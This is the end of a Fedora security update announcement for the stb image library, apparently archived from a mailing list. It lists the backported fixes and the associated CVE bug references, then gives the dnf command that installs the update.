\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-2
- Backport three PR���s fixing undefined behavior in stb\_image
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-1
- Update to 0^beebb24git20231011 (minor C99 fixes)
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2246102 - CVE-2023-45661 stb: out of bounds read
<https://bugzilla.redhat.com/show_bug.cgi?id=2246102>
[ 2 ] Bug #2246103 - CVE-2023-45662 stb: out of bounds read
<https://bugzilla.redhat.com/show_bug.cgi?id=2246103>
[ 3 ] Bug #2246104 - CVE-2023-45663 stb: memory access violations
<https://bugzilla.redhat.com/show_bug.cgi?id=2246104>
[ 4 ] Bug #2246105 - CVE-2023-45664 stb: memory access violations
<https://bugzilla.redhat.com/show_bug.cgi?id=2246105>
[ 5 ] Bug #2246109 - CVE-2023-45666 stb: memory access violation
<https://bugzilla.redhat.com/show_bug.cgi?id=2246109>
[ 6 ] Bug #2246110 - CVE-2023-45667 stb: memory access violation
<https://bugzilla.redhat.com/show_bug.cgi?id=2246110>
[ 7 ] Bug #2246320 - CVE-2023-43281 stb: remote denial of service
<https://bugzilla.redhat.com/show_bug.cgi?id=2246320>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2023-a93c06a1d9' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/QVABVF4GEM6BYD5L4L64RCRSXUHY6LGN/#QVABVF4GEM6BYD5L4L64RCRSXUHY6LGN)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.


